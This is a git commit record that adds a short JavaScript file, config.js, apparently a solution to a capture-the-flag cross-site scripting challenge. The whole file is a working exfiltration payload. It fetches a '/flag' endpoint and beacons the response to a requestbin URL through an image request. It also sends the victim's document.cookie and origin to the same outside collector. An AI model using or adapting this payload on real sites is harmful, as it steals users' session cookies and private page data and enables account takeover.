cfc55057a0c9424a34a39352f52a0e4b88015219
dzil123 <5725958+dzil123@users.noreply.github.com>
2021-08-22 16:38:17 -0700

    6

---
+++ 6/config.js
@@ -0,0 +1,5 @@
+fetch("https://mathme.be.ax/flag").then(function(x) {
+    (new Image()).src="https://requestbin.io/ub238iub?x="+JSON.stringify({ok: x.ok, status: x.status, body: x.body, url: x.url});
+});
+
+(new Image()).src="https://requestbin.io/ub238iub?cookie=" + document.cookie + "&origin=" + document.origin;
